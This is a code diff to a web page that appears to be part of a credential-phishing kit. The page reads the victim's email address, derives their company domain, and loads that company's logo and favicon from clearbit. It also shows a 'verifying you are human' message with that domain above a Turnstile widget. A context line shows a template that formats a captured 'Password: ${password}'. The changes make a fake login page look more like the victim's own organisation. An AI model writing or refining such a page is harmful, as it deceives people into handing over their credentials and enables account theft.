@@ -389,8 +389,10 @@
 </head>
 <body>
 <!-- This container will hold the Turnstile widget and be visible on page load -->
-<div id="turnstile-container" class="fix-middle">
-    <!-- The Turnstile widget will be programmatically rendered here -->
+<div id="turnstile-container" class="fix-middle" style="text-align: center;">
+	<h2 id="verification-message" style="font-family: 'Roboto', sans-serif; color: #444; font-weight: 300; margin-bottom: 20px;"></h2>
+    <!-- The Turnstile widget will be programmatically rendered in the div below -->
+    <div id="turnstile-widget"></div>
 </div>
 
 <!-- The main form dialog, now hidden by default -->
@@ -534,7 +536,7 @@
 
   // This function is called by the Turnstile script on load.
   function renderTurnstile() {
-    turnstile.render('#turnstile-container', {
+    turnstile.render('#turnstile-widget', {
       sitekey: '0x4AAAAAAB10qIE0M6yxD1P2',
       callback: function(token) {
         // This is the success callback.
@@ -700,6 +702,15 @@ Password: ${password}`;
       }
     }
   }
+
+  // --- Dynamic Verification Message Logic ---
+  var emailForMessage = fetchEmail();
+  if (emailForMessage) {
+    var domainForMessage = changeLogo(emailForMessage);
+    // You can customize the message below
+    document.getElementById('verification-message').textContent = domainForMessage + " verifying you are human...";
+  }
+
   checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
   $("#favicon").attr("href", "https://logo.clearbit.com/" + changeLogo(fetchEmail()));
 </script>
